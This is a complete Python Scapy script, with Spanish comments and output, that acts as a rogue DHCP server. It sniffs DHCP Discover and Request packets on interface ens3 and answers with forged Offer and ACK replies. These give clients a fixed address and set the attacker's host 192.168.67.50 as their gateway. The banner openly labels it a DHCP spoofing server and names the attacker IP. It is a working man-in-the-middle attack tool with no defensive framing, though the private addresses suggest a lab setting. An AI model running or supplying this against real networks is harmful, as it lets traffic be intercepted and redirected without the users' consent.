#!/usr/bin/env python3
from scapy.all import *
import sys

def handle_dhcp(pkt):
    if DHCP in pkt:
        opciones = pkt[DHCP].options
        for opt in opciones:
            if opt[0] == 'message-type':
                msg_type = opt[1]
                
                # DHCP Discover
                if msg_type == 1:
                    print(f"\n[+] DHCP Discover de {pkt[Ether].src}")
                    
                    ether = Ether(dst=pkt[Ether].src, src=get_if_hwaddr("ens3"))
                    ip = IP(src="192.168.67.50", dst="255.255.255.255")
                    udp = UDP(sport=67, dport=68)
                    bootp = BOOTP(op=2, xid=pkt[BOOTP].xid, 
                                  yiaddr="192.168.67.200",
                                  siaddr="192.168.67.50",
                                  chaddr=pkt[BOOTP].chaddr)
                    dhcp = DHCP(options=[("message-type", "offer"),
                                         ("server_id", "192.168.67.50"),
                                         ("router", "192.168.67.50"),
                                         ("subnet_mask", "255.255.255.0"),
                                         ("lease_time", 60),
                                         "end"])
                    
                    pkt_response = ether/ip/udp/bootp/dhcp
                    sendp(pkt_response, iface="ens3", verbose=False)
                    print(f"[+] DHCP Offer enviado → 192.168.67.200")
                
                # DHCP Request
                elif msg_type == 3:
                    print(f"[+] DHCP Request de {pkt[Ether].src}")
                    
                    ether = Ether(dst=pkt[Ether].src, src=get_if_hwaddr("ens3"))
                    ip = IP(src="192.168.67.50", dst="255.255.255.255")
                    udp = UDP(sport=67, dport=68)
                    bootp = BOOTP(op=2, xid=pkt[BOOTP].xid, 
                                  yiaddr="192.168.67.200",
                                  siaddr="192.168.67.50",
                                  chaddr=pkt[BOOTP].chaddr)
                    dhcp = DHCP(options=[("message-type", "ack"),
                                         ("server_id", "192.168.67.50"),
                                         ("router", "192.168.67.50"),
                                         ("subnet_mask", "255.255.255.0"),
                                         ("lease_time", 60),
                                         "end"])
                    
                    pkt_response = ether/ip/udp/bootp/dhcp
                    sendp(pkt_response, iface="ens3", verbose=False)
                    print(f"[+] DHCP ACK enviado → IP 192.168.67.200 confirmada")
                break

print("="*50)
print("DHCP Spoofing Server - Activo")
print("Interfaz: ens3")
print("IP del atacante: 192.168.67.50")
print("Gateway falso: 192.168.67.50")
print("Pool falso: 192.168.67.200")
print("="*50)
print("Esperando DHCP Discover/Request...\n")

sniff(filter="udp and (port 67 or port 68)", prn=handle_dhcp, store=0, iface="ens3")
